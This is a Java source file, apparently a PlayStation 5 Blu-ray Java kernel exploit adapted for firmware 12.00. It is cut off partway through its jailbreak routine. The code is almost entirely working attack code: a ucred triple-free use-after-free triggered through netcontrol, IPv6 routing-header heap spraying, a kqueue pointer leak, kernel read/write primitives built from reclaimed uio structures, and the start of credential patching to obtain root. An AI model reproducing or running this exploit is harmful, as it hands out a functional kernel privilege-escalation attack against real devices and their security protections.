/*
 * Copyright (C) 2025 Andy Nguyen
 * Modified by MassZero for PS5 12.00 Poops autoloader integration.
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

package org.homebrew;

import org.bdj.api.API;
import org.bdj.api.Buffer;
import org.bdj.api.Int8;
import org.bdj.api.Int32;
import org.bdj.api.Int32Array;
import org.bdj.api.Int64;
import org.bdj.api.KernelAPI;
import org.bdj.Status;

public class Poops {
  private static final boolean SEND_HELPER_ELFS = true;

  private static final String DUP_SYMBOL = "dup";
  private static final String CLOSE_SYMBOL = "close";
  private static final String READ_SYMBOL = "read";
  private static final String READV_SYMBOL = "readv";
  private static final String WRITE_SYMBOL = "write";
  private static final String WRITEV_SYMBOL = "writev";
  private static final String IOCTL_SYMBOL = "ioctl";
  private static final String PIPE_SYMBOL = "pipe";
  private static final String KQUEUE_SYMBOL = "kqueue";
  private static final String SOCKET_SYMBOL = "socket";
  private static final String SOCKETPAIR_SYMBOL = "socketpair";
  private static final String RECVMSG_SYMBOL = "recvmsg";
  private static final String GETSOCKOPT_SYMBOL = "getsockopt";
  private static final String SETSOCKOPT_SYMBOL = "setsockopt";
  private static final String SETUID_SYMBOL = "setuid";
  private static final String GETPID_SYMBOL = "getpid";
  private static final String GETUID_SYMBOL = "getuid";
  private static final String SCHED_YIELD_SYMBOL = "sched_yield";
  private static final String NANOSLEEP_SYMBOL = "nanosleep";
  private static final String CPUSET_SETAFFINITY_SYMBOL = "cpuset_setaffinity";
  private static final String RTPRIO_THREAD_SYMBOL = "rtprio_thread";
  private static final String SYS_NETCONTROL_SYMBOL = "__sys_netcontrol";

  private static final int KERNEL_PID = 0;

  private static final long SYSCORE_AUTHID = 0x4800000000000007L;

  private static final long FIOSETOWN = 0x8004667CL;

  private static final int PAGE_SIZE = 0x4000;

  private static final int NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
  private static final int NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;

  private static final int AF_UNIX = 1;
  private static final int AF_INET6 = 28;
  private static final int SOCK_STREAM = 1;
  private static final int IPPROTO_IPV6 = 41;

  private static final int SO_SNDBUF = 0x1001;
  private static final int SOL_SOCKET = 0xffff;

  private static final int IPV6_RTHDR = 51;
  private static final int IPV6_RTHDR_TYPE_0 = 0;

  private static final int RTP_PRIO_REALTIME = 2;
  private static final int RTP_SET = 1;

  private static final int UIO_READ = 0;
  private static final int UIO_WRITE = 1;
  private static final int UIO_SYSSPACE = 1;

  private static final int CPU_LEVEL_WHICH = 3;
  private static final int CPU_WHICH_TID = 1;

  private static final int IOV_SIZE = 0x10;
  private static final int CPU_SET_SIZE = 0x10;
  private static final int PIPEBUF_SIZE = 0x18;
  private static final int MSG_HDR_SIZE = 0x30;
  private static final int FILEDESCENT_SIZE = 0x30;
  private static final int UCRED_SIZE = 0x168;
  private static final int FD_CDIR = 0x08;
  private static final int FD_RDIR = 0x10;
  private static final int FD_JDIR = 0x18;
  private static final int UCRED_CR_PRISON = 0x30;
  private static final int PROC_VM_SPACE = 0x200;
  private static final int PMAP_CR3 = 0x28;
  private static final int PMAP_PML4 = 0x20;
  private static final int SIZEOF_GVMSPACE = 0x100;
  private static final int GVMSPACE_START_VA = 0x08;
  private static final int GVMSPACE_SIZE = 0x10;
  private static final int GVMSPACE_PAGE_DIR = 0x38;
  private static final int INPCB_PKTOPTS = 0x120;

  private static final int RTHDR_TAG = 0x13370000;

  private static final int UIO_IOV_NUM = 0x14;
  private static final int MSG_IOV_NUM = 0x17;

  private static final int IPV6_SOCK_NUM = 64;
  private static final int IOV_THREAD_NUM = 4;
  private static final int UIO_THREAD_NUM = 4;

  private static final int COMMAND_UIO_READ = 0;
  private static final int COMMAND_UIO_WRITE = 1;

  private static final int MAIN_CORE = 11;

  private static final long ELF_LOADER_BOOT_WAIT_MS = 1000L;
  private static final long POST_ELF_LOADER_WAIT_MS = 1000L;
  private static final long SLEEP_HEALTHCHECK_MS = 100L;
  private static final boolean NETWORK_LOG = true;
  private static final String LOG_IP = "192.168.1.135";
  private static final int LOG_PORT = 1337;

  private static final API api;

  private static final KernelAPI kapi = KernelAPI.getInstance();
  private static java.net.Socket logSocket;
  private static java.io.OutputStream logOut;
  private static boolean tcpLogAttempted;
  private static long libkernel;
  private static long tail_scePthreadCreate;
  private static long tail_open;
  private static long tail_mprotect;
  private static long tail_nanosleep;
  private static long tail_allocDmem;
  private static long tail_mapDmem;
  private static long tail_mmap;
  private static long tail_jitshmCreate;
  private static long tail_jitshmAlias;
  private static long tail_sysctlbyname;
  private static long tail_getpid;
  private static long tail_ioctl;
  private static long tail_pipe;
  private static long tail_socket;
  private static long tail_setsockopt;
  private static long tail_schedYield;
  private static long tail_pthreadAttrInit;
  private static long tail_pthreadAttrSetstacksize;
  private static long tail_pthreadAttrSetdetachstate;
  private static long tail_pthreadAttrDestroy;

  private static long DATA_BASE_OFF;
  private static long ALLPROC;
  private static long SECURITY_FLAGS;
  private static long KERNEL_PMAP_STORE;
  private static long GVMSPACE;
  private static long ROOTVNODE;
  private static long dataBase;
  private static long savedProcUcred;
  private static long savedProcFd;
  private static long savedFdCdir;
  private static long savedFdRdir;
  private static long savedFdJdir;
  private static long savedPrison;
  private static Buffer ksleepTs;

  static {
    try {
      api = API.getInstance();
    } catch (Exception e) {
      throw new ExceptionInInitializerError(e);
    }
  }

  private static synchronized void initTcpLog() {
    if (!NETWORK_LOG || tcpLogAttempted) {
      return;
    }
    tcpLogAttempted = true;

    try {
      logSocket = new java.net.Socket();
      logSocket.connect(new java.net.InetSocketAddress(LOG_IP, LOG_PORT), 1000);
      logOut = logSocket.getOutputStream();
      tcpLogLine("[JarLoader] [*] TCP logger raw stream ready");
      tcpLogLine("[JarLoader] [*] TCP logger connected to "
              .concat(LOG_IP).concat(":").concat(String.valueOf(LOG_PORT)));
    } catch (Throwable e) {
      closeTcpLog();
      System.out.println("[JarLoader] [!] TCP logger unavailable, falling back to println: "
              .concat(String.valueOf(e)));
    }
  }

  private static synchronized void tcpLogLine(String msg) {
    if (logOut == null) {
      return;
    }
    try {
      logOut.write(msg.concat("\n").getBytes("UTF-8"));
      logOut.flush();
    } catch (Throwable e) {
      closeTcpLog();
    }
  }

  private static void log(String msg) {
    String line = "[JarLoader] ".concat(String.valueOf(msg));
    if (NETWORK_LOG) {
      System.out.println(line);
      initTcpLog();
      tcpLogLine(line);
    } else {
      Status.println(line);
    }
  }

  private static void screenLog(String msg) {
    log(msg);
    if (NETWORK_LOG) {
      Status.println("[JarLoader] ".concat(String.valueOf(msg)));
    }
  }

  private static synchronized void closeTcpLog() {
    if (logOut != null) {
      try { logOut.close(); } catch (Throwable e) {}
      logOut = null;
    }
    if (logSocket != null) {
      try { logSocket.close(); } catch (Throwable e) {}
      logSocket = null;
    }
  }

  private static boolean resolveSleepHealthSyscall() {
    if (tail_nanosleep != 0) {
      return true;
    }

    tail_nanosleep = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, NANOSLEEP_SYMBOL);
    if (tail_nanosleep != 0) {
      return true;
    }

    log("[!] verifySleepHealth: nanosleep symbol not found.");
    return false;
  }

  private static long elapsedMs(long startMs) {
    long elapsed = System.currentTimeMillis() - startMs;
    return elapsed < 0 ? 0 : elapsed;
  }

  private static boolean sleepDurationLooksSane(String name, long elapsed, long expected) {
    long min = expected <= 20 ? 0 : expected / 2;
    long max = expected + Math.max(1000L, expected * 10L);

    if (elapsed < min) {
      log("[!] ".concat(name).concat(" healthcheck too short: elapsed=")
              .concat(String.valueOf(elapsed)).concat("ms expected=")
              .concat(String.valueOf(expected)).concat("ms"));
      return false;
    }

    if (elapsed > max) {
      log("[!] ".concat(name).concat(" healthcheck too long: elapsed=")
              .concat(String.valueOf(elapsed)).concat("ms expected=")
              .concat(String.valueOf(expected)).concat("ms"));
      return false;
    }

    return true;
  }

  private static boolean verifySleepHealth(long millis) {
    log("[i] verifySleepHealth: enter");
    if (!resolveSleepHealthSyscall()) {
      return false;
    }

    long startMs = System.currentTimeMillis();
    log("[i] verifySleepHealth: before ksleep(".concat(String.valueOf(millis)).concat(")"));
    ksleep(millis);
    log("[i] verifySleepHealth: after ksleep(".concat(String.valueOf(millis)).concat(")"));
    long nativeElapsed = elapsedMs(startMs);
    log("[i] ksleep(".concat(String.valueOf(millis)).concat(") elapsed=")
            .concat(String.valueOf(nativeElapsed)).concat("ms"));
    if (!sleepDurationLooksSane("ksleep", nativeElapsed, millis)) {
      return false;
    }

    log("[i] verifySleepHealth: exit ok");
    return true;
  }

  private static boolean alreadyJailbroken() {
    try {
      long getuid = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, GETUID_SYMBOL);
      if (getuid == 0) {
        return false;
      }
      return ((int) api.call(getuid)) == 0;
    } catch (Throwable e) {
      return false;
    }
  }

  private final long dup;
  private final long close;
  private final long read;
  private final long readv;
  private final long write;
  private final long writev;
  private final long ioctl;
  private final long pipe;
  private final long kqueue;
  private final long socket;
  private final long socketpair;
  private final long recvmsg;
  private final long getsockopt;
  private final long setsockopt;
  private final long setuid;
  private final long getpid;
  private final long sched_yield;
  private final long cpuset_setaffinity;
  private final long rtprio_thread;
  private final long __sys_netcontrol;

  private int[] twins = new int[2];
  private int[] triplets = new int[3];
  private int[] ipv6Socks = new int[IPV6_SOCK_NUM];

  private Buffer sprayRthdr = new Buffer(UCRED_SIZE);
  private int sprayRthdrLen;
  private Buffer leakRthdr = new Buffer(UCRED_SIZE);
  private Int32 leakRthdrLen = new Int32();

  private Buffer msg = new Buffer(MSG_HDR_SIZE);
  private Buffer msgIov = new Buffer(MSG_IOV_NUM * IOV_SIZE);
  private Buffer uioIovRead = new Buffer(UIO_IOV_NUM * IOV_SIZE);
  private Buffer uioIovWrite = new Buffer(UIO_IOV_NUM * IOV_SIZE);

  private Int32Array uioSs = new Int32Array(2);
  private Int32Array iovSs = new Int32Array(2);

  private IovThread[] iovThreads = new IovThread[IOV_THREAD_NUM];
  private UioThread[] uioThreads = new UioThread[UIO_THREAD_NUM];

  private WorkerState iovState = new WorkerState(IOV_THREAD_NUM);
  private WorkerState uioState = new WorkerState(UIO_THREAD_NUM);

  private int uafSock;

  private int uioSs0;
  private int uioSs1;

  private int iovSs0;
  private int iovSs1;

  private long kq_fdp;
  private long fdt_ofiles;
  private long allproc;

  private Buffer tmp = new Buffer(PAGE_SIZE);

  public Poops() {
    dup = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, DUP_SYMBOL);
    close = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, CLOSE_SYMBOL);
    read = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, READ_SYMBOL);
    readv = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, READV_SYMBOL);
    write = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, WRITE_SYMBOL);
    writev = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, WRITEV_SYMBOL);
    ioctl = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, IOCTL_SYMBOL);
    pipe = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, PIPE_SYMBOL);
    kqueue = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, KQUEUE_SYMBOL);
    socket = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SOCKET_SYMBOL);
    socketpair = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SOCKETPAIR_SYMBOL);
    recvmsg = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, RECVMSG_SYMBOL);
    getsockopt = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, GETSOCKOPT_SYMBOL);
    setsockopt = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SETSOCKOPT_SYMBOL);
    setuid = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SETUID_SYMBOL);
    getpid = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, GETPID_SYMBOL);
    sched_yield = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SCHED_YIELD_SYMBOL);
    cpuset_setaffinity = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, CPUSET_SETAFFINITY_SYMBOL);
    rtprio_thread = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, RTPRIO_THREAD_SYMBOL);
    __sys_netcontrol = api.dlsym(API.LIBKERNEL_MODULE_HANDLE, SYS_NETCONTROL_SYMBOL);

    if (dup == 0
            || close == 0
            || read == 0
            || readv == 0
            || write == 0
            || writev == 0
            || ioctl == 0
            || pipe == 0
            || kqueue == 0
            || socket == 0
            || socketpair == 0
            || recvmsg == 0
            || getsockopt == 0
            || setsockopt == 0
            || setuid == 0
            || getpid == 0
            || sched_yield == 0
            || cpuset_setaffinity == 0
            || rtprio_thread == 0
            || __sys_netcontrol == 0) {
      throw new IllegalStateException("symbols not found");
    }

    // Prepare spray buffer.
    sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);

    // Prepare msg iov buffer.
    msg.putLong(0x10, msgIov.address()); // msg_iov
    msg.putLong(0x18, MSG_IOV_NUM); // msg_iovlen

    Buffer dummyBuffer = new Buffer(0x1000);
    dummyBuffer.fill((byte) 0x41);
    uioIovRead.putLong(0x00, dummyBuffer.address());
    uioIovWrite.putLong(0x00, dummyBuffer.address());
  }

  private int dup(int fd) {
    return (int) api.call(dup, fd);
  }

  private int close(int fd) {
    return (int) api.call(close, fd);
  }

  private long read(int fd, Buffer buf, long nbytes) {
    return api.call(read, fd, buf != null ? buf.address() : 0, nbytes);
  }

  private long readv(int fd, Buffer iov, int iovcnt) {
    return api.call(readv, fd, iov != null ? iov.address() : 0, iovcnt);
  }

  private long write(int fd, Buffer buf, long nbytes) {
    return api.call(write, fd, buf != null ? buf.address() : 0, nbytes);
  }

  private long writev(int fd, Buffer iov, int iovcnt) {
    return api.call(writev, fd, iov != null ? iov.address() : 0, iovcnt);
  }

  private int ioctl(int fd, long request, long arg0) {
    return (int) api.call(ioctl, fd, request, arg0);
  }

  private int pipe(Int32Array fildes) {
    return (int) api.call(pipe, fildes != null ? fildes.address() : 0);
  }

  private int kqueue() {
    return (int) api.call(kqueue);
  }

  private int socket(int domain, int type, int protocol) {
    return (int) api.call(socket, domain, type, protocol);
  }

  private int socketpair(int domain, int type, int protocol, Int32Array sv) {
    return (int) api.call(socketpair, domain, type, protocol, sv != null ? sv.address() : 0);
  }

  private int recvmsg(int s, Buffer msg, int flags) {
    return (int) api.call(recvmsg, s, msg != null ? msg.address() : 0, flags);
  }

  private int getsockopt(int s, int level, int optname, Buffer optval, Int32 optlen) {
    return (int)
            api.call(
                    getsockopt,
                    s,
                    level,
                    optname,
                    optval != null ? optval.address() : 0,
                    optlen != null ? optlen.address() : 0);
  }

  private int setsockopt(int s, int level, int optname, Buffer optval, int optlen) {
    return (int)
            api.call(setsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen);
  }

  private int setuid(int uid) {
    return (int) api.call(setuid, uid);
  }

  private int getpid() {
    return (int) api.call(getpid);
  }

  private int sched_yield() {
    return (int) api.call(sched_yield);
  }

  private int cpuset_setaffinity(int level, int which, long id, long setsize, Buffer mask) {
    return (int)
            api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
  }

  private int rtprio_thread(int function, int lwpid, long rtp) {
    return (int) api.call(rtprio_thread, function, lwpid, rtp);
  }

  private int __sys_netcontrol(int ifindex, int cmd, Buffer buf, int size) {
    return (int) api.call(__sys_netcontrol, ifindex, cmd, buf != null ? buf.address() : 0, size);
  }

  private int buildRthdr(Buffer buf, int size) {
    int len = ((size >> 3) - 1) & ~1;
    buf.putByte(0x00, (byte) 0); // ip6r_nxt
    buf.putByte(0x01, (byte) len); // ip6r_len
    buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0); // ip6r_type
    buf.putByte(0x03, (byte) (len >> 1)); // ip6r_segleft
    return (len + 1) << 3;
  }

  private int getRthdr(int s, Buffer buf, Int32 len) {
    return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
  }

  private int setRthdr(int s, Buffer buf, int len) {
    return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
  }

  private int freeRthdr(int s) {
    return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, null, 0);
  }

  private int cpusetSetAffinity(int core) {
    Buffer mask = new Buffer(CPU_SET_SIZE);
    mask.putShort(0x00, (short) (1 << core));
    return cpuset_setaffinity(
            CPU_LEVEL_WHICH, CPU_WHICH_TID, 0xFFFFFFFFFFFFFFFFL, CPU_SET_SIZE, mask);
  }

  private int rtprioThread(int value) {
    Buffer prio = new Buffer(0x4);
    prio.putShort(0x00, (short) RTP_PRIO_REALTIME);
    prio.putShort(0x02, (short) value);
    return rtprio_thread(RTP_SET, 0, prio.address());
  }

  private void findTwins() {
    while (true) {
      for (int i = 0; i < ipv6Socks.length; i++) {
        sprayRthdr.putInt(0x04, RTHDR_TAG | i);
        setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
      }

      for (int i = 0; i < ipv6Socks.length; i++) {
        leakRthdrLen.set(Int64.SIZE);
        getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
        int val = leakRthdr.getInt(0x04);
        int j = val & 0xFFFF;
        if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
          twins[0] = i;
          twins[1] = j;
          return;
        }
      }
    }
  }

  private int findTriplet(int master, int other) {
    while (true) {
      for (int i = 0; i < ipv6Socks.length; i++) {
        if (i == master || i == other) {
          continue;
        }

        sprayRthdr.putInt(0x04, RTHDR_TAG | i);
        setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
      }

      for (int i = 0; i < ipv6Socks.length; i++) {
        if (i == master || i == other) {
          continue;
        }

        leakRthdrLen.set(Int64.SIZE);
        getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
        int val = leakRthdr.getInt(0x04);
        int j = val & 0xFFFF;
        if ((val & 0xFFFF0000) == RTHDR_TAG && j != master && j != other) {
          return j;
        }
      }
    }
  }

  private void triggerUcredTripleFree() {
    log("[*] UAF setup: preparing netcontrol/ucred reclaim");
    Buffer setBuf = new Buffer(8);
    Buffer clearBuf = new Buffer(8);

    // Prepare msg iov spray. Set 1 as iov_base as it will be interpreted as cr_refcnt.
    msgIov.putLong(0x00, 1); // iov_base
    msgIov.putLong(0x08, Int8.SIZE); // iov_len

    // Create dummy socket to be registered and then closed.
    int dummySock = socket(AF_UNIX, SOCK_STREAM, 0);
    log("[*] UAF setup: registered dummy socket fd=".concat(String.valueOf(dummySock)));

    // Register dummy socket.
    setBuf.putInt(0x00, dummySock);
    int setRet = __sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());

    // Close the dummy socket.
    int closeDummyRet = close(dummySock);

    // Allocate a new ucred.
    int setuidRet0 = setuid(1);

    // Reclaim the file descriptor.
    uafSock = socket(AF_UNIX, SOCK_STREAM, 0);

    // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
    int setuidRet1 = setuid(1);

    // Unregister dummy socket and free the file and ucred.
    clearBuf.putInt(0x00, uafSock);
    int clearRet = __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());

    // Set cr_refcnt back to 1.
    for (int i = 0; i < 32; i++) {
      if ((i & 7) == 0) {
      }

      // Reclaim with iov.
      iovState.signalWork(0);
      sched_yield();

      // Release buffers.
      write(iovSs1, tmp, Int8.SIZE);
      iovState.waitForFinished();
      read(iovSs0, tmp, Int8.SIZE);
    }

    // Double free ucred.
    // Note: Only dup works because it does not check f_hold.
    int dupRet0 = dup(uafSock);
    int closeDupRet0 = close(dupRet0);

    // Find twins.
    findTwins();
    log("[+] UAF setup: overlapping IPv6 sockets found twins="
            .concat(String.valueOf(twins[0])).concat(",").concat(String.valueOf(twins[1])));

    // Free one.
    int freeTwinRet = freeRthdr(ipv6Socks[twins[1]]);

    // Set cr_refcnt back to 1.
    int tripleReclaimIters = 0;
    while (true) {
      if (tripleReclaimIters == 0) {
      } else if ((tripleReclaimIters & 0x3ff) == 0) {
      }

      // Reclaim with iov.
      iovState.signalWork(0);
      sched_yield();

      leakRthdrLen.set(Int64.SIZE);
      getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);

      if (leakRthdr.getInt(0x00) == 1) {
        log("[+] UAF setup: controlled reclaim matched after "
                .concat(String.valueOf(tripleReclaimIters + 1)).concat(" iterations"));
        break;
      }

      // Release iov spray.
      write(iovSs1, tmp, Int8.SIZE);
      iovState.waitForFinished();
      read(iovSs0, tmp, Int8.SIZE);
      tripleReclaimIters++;
    }

    triplets[0] = twins[0];
    log("[+] UAF setup: first reclaim socket index=".concat(String.valueOf(triplets[0])));

    // Triple free ucred.
    int dupRet1 = dup(uafSock);
    int closeDupRet1 = close(dupRet1);

    // Find triplet.
    triplets[1] = findTriplet(triplets[0], -1);
    log("[+] UAF setup: second reclaim socket index=".concat(String.valueOf(triplets[1])));

    // Release iov spray.
    long releaseWriteRet = write(iovSs1, tmp, Int8.SIZE);

    // Find triplet.
    triplets[2] = findTriplet(triplets[0], triplets[1]);
    log("[+] UAF setup: third reclaim socket index=".concat(String.valueOf(triplets[2])));

    iovState.waitForFinished();
    read(iovSs0, tmp, Int8.SIZE);
    log("[+] UAF setup: triple-free primitive prepared");
  }

  private void leakKqueue() {
    log("[*] Kernel leak: reclaiming kqueue object to leak filedesc pointer");

    // Free one.
    freeRthdr(ipv6Socks[triplets[1]]);

    // Leak kqueue.
    int kq = 0;
    while (true) {
      kq = kqueue();

      // Leak with other rthdr.
      leakRthdrLen.set(0x100);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

      if (leakRthdr.getLong(0x08) == 0x1430000) {
        break;
      }

      close(kq);
    }

    kq_fdp = leakRthdr.getLong(0xA8);
    log("[+] Kernel leak: kqueue filedesc pointer = ".concat(hx64(kq_fdp)));

    // Close kqueue to free buffer.
    close(kq);

    // Find triplet.
    triplets[1] = findTriplet(triplets[0], triplets[2]);
  }

  private void buildUio(Buffer uio, long uio_iov, long uio_td, boolean read, long addr, long size) {
    uio.putLong(0x00, uio_iov); // uio_iov
    uio.putLong(0x08, UIO_IOV_NUM); // uio_iovcnt
    uio.putLong(0x10, 0xFFFFFFFFFFFFFFFFL); // uio_offset
    uio.putLong(0x18, size); // uio_resid
    uio.putInt(0x20, UIO_SYSSPACE); // uio_segflg
    uio.putInt(0x24, read ? UIO_WRITE : UIO_READ); // uio_segflg
    uio.putLong(0x28, uio_td); // uio_td
    uio.putLong(0x30, addr); // iov_base
    uio.putLong(0x38, size); // iov_len
  }

  private Buffer kreadSlow(long addr, int size) {
    // Prepare leak buffers.
    Buffer[] leakBuffers = new Buffer[UIO_THREAD_NUM];
    for (int i = 0; i < UIO_THREAD_NUM; i++) {
      leakBuffers[i] = new Buffer(size);
    }

    // Set send buf size.
    Int32 bufSize = new Int32(size);
    setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());

    // Fill queue.
    write(uioSs1, tmp, size);

    // Set iov length
    uioIovRead.putLong(0x08, size);

    // Free one.
    freeRthdr(ipv6Socks[triplets[1]]);

    // Reclaim with uio.
    while (true) {
      uioState.signalWork(COMMAND_UIO_READ);
      sched_yield();

      // Leak with other rthdr.
      leakRthdrLen.set(0x10);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

      if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
        break;
      }

      // Wake up all threads.
      read(uioSs0, tmp, size);

      for (int i = 0; i < UIO_THREAD_NUM; i++) {
        read(uioSs0, leakBuffers[i], leakBuffers[i].size());
      }

      uioState.waitForFinished();

      // Fill queue.
      write(uioSs1, tmp, size);
    }

    long uio_iov = leakRthdr.getLong(0x00);

    // Prepare uio reclaim buffer.
    buildUio(msgIov, uio_iov, 0, true, addr, size);

    // Free second one.
    freeRthdr(ipv6Socks[triplets[2]]);

    // Reclaim uio with iov.
    while (true) {
      // Reclaim with iov.
      iovState.signalWork(0);
      sched_yield();

      // Leak with other rthdr.
      leakRthdrLen.set(0x40);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

      if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
        break;
      }

      // Release iov spray.
      write(iovSs1, tmp, Int8.SIZE);
      iovState.waitForFinished();
      read(iovSs0, tmp, Int8.SIZE);
    }

    // Wake up all threads.
    read(uioSs0, tmp, size);

    // Read the results now.
    Buffer leakBuffer = null;

    // Get leak.
    for (int i = 0; i < UIO_THREAD_NUM; i++) {
      read(uioSs0, leakBuffers[i], leakBuffers[i].size());

      if (leakBuffers[i].getLong(0x00) != 0x4141414141414141L) {
        // Find triplet.
        triplets[1] = findTriplet(triplets[0], -1);

        leakBuffer = leakBuffers[i];
      }
    }

    uioState.waitForFinished();

    // Release iov spray.
    write(iovSs1, tmp, Int8.SIZE);

    // Find triplet.
    triplets[2] = findTriplet(triplets[0], triplets[1]);

    iovState.waitForFinished();
    read(iovSs0, tmp, Int8.SIZE);

    return leakBuffer;
  }

  private void kwriteSlow(long addr, Buffer buffer) {
    // Set send buf size.
    Int32 bufSize = new Int32(buffer.size());
    setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());

    // Set iov length.
    uioIovWrite.putLong(0x08, buffer.size());

    // Free first triplet.
    freeRthdr(ipv6Socks[triplets[1]]);

    // Reclaim with uio.
    while (true) {
      uioState.signalWork(COMMAND_UIO_WRITE);
      sched_yield();

      // Leak with other rthdr.
      leakRthdrLen.set(0x10);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

      if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
        break;
      }

      // Wake up all threads.
      for (int i = 0; i < UIO_THREAD_NUM; i++) {
        write(uioSs1, buffer, buffer.size());
      }

      uioState.waitForFinished();
    }

    long uio_iov = leakRthdr.getLong(0x00);

    // Prepare uio reclaim buffer.
    buildUio(msgIov, uio_iov, 0, false, addr, buffer.size());

    // Free second one.
    freeRthdr(ipv6Socks[triplets[2]]);

    // Reclaim uio with iov.
    while (true) {
      // Reclaim with iov.
      iovState.signalWork(0);
      sched_yield();

      // Leak with other rthdr.
      leakRthdrLen.set(0x40);
      getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);

      if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
        break;
      }

      // Release iov spray.
      write(iovSs1, tmp, Int8.SIZE);
      iovState.waitForFinished();
      read(iovSs0, tmp, Int8.SIZE);
    }

    // Corrupt data.
    for (int i = 0; i < UIO_THREAD_NUM; i++) {
      write(uioSs1, buffer, buffer.size());
    }

    // Find triplet.
    triplets[1] = findTriplet(triplets[0], -1);

    uioState.waitForFinished();

    // Release iov spray.
    write(iovSs1, tmp, Int8.SIZE);

    // Find triplet.
    triplets[2] = findTriplet(triplets[0], triplets[1]);

    iovState.waitForFinished();
    read(iovSs0, tmp, Int8.SIZE);
  }

  private long kreadSlow64(long address) {
    return kreadSlow(address, Int64.SIZE).getLong(0x00);
  }

  private long fget(int fd) {
    return kapi.kread64(fdt_ofiles + fd * FILEDESCENT_SIZE);
  }

  private long findAllProc() {
    Int32Array pipeFd = new Int32Array(2);
    pipe(pipeFd);

    Int32 currPid = new Int32();
    currPid.set(getpid());
    ioctl(pipeFd.get(0), FIOSETOWN, currPid.address());

    long fp = fget(pipeFd.get(0));
    long f_data = kapi.kread64(fp + 0x00);
    long pipe_sigio = kapi.kread64(f_data + 0xd8);
    long p = kapi.kread64(pipe_sigio);

    while ((p & 0xFFFFFFFF00000000L) != 0xFFFFFFFF00000000L) {
      p = kapi.kread64(p + 0x08); // p_list.le_prev
    }

    close(pipeFd.get(1));
    close(pipeFd.get(0));

    return p;
  }

  private long pfind(int pid) {
    long p = kapi.kread64(allproc);
    while (p != 0) {
      if (kapi.kread32(p + 0xbc) == pid) {
        break;
      }
      p = kapi.kread64(p + 0x00); // p_list.le_next
    }

    return p;
  }

  private void fhold(long fp) {
    kapi.kwrite32(fp + 0x28, kapi.kread32(fp + 0x28) + 1); // f_count
  }

  private void removeRthrFromSocket(int fd) {
    long fp = fget(fd);
    long f_data = kapi.kread64(fp + 0x00);
    long so_pcb = kapi.kread64(f_data + 0x18);
    long in6p_outputopts = kapi.kread64(so_pcb + 0x120);
    kapi.kwrite64(in6p_outputopts + 0x70, 0); // ip6po_rhi_rthdr
  }

  private void removeUafFile() {
    long uafFile = fget(uafSock);

    // Remove uaf sock.
    kapi.kwrite64(fdt_ofiles + uafSock * FILEDESCENT_SIZE, 0);

    // Remove triple freed file from uaf sock.
    int removed = 0;
    Int32Array ss = new Int32Array(2);
    for (int i = 0; i < 0x1000; i++) {
      int s = socket(AF_UNIX, SOCK_STREAM, 0);
      if (fget(s) == uafFile) {
        kapi.kwrite64(fdt_ofiles + s * FILEDESCENT_SIZE, 0);
        removed++;
      }
      close(s);

      if (removed == 3) {
        break;
      }
    }
  }

  private long getRootVnode() {
    long p = pfind(KERNEL_PID);
    long p_fd = kapi.kread64(p + 0x48);
    long rootvnode = kapi.kread64(p_fd + 0x08);
    return rootvnode;
  }

  private long getPrison0() {
    long p = pfind(KERNEL_PID);
    long p_ucred = kapi.kread64(p + 0x40);
    long prison0 = kapi.kread64(p_ucred + 0x30);
    return prison0;
  }

  private void jailbreak() {
    long p = pfind(getpid());

    // Patch credentials and capabilities.
    long prison0 = getPrison0();
    long p_ucred = kapi.kread64(p + 0x40);
    kapi.kwrite32(p_ucred + 0x04, 0); // cr_uid
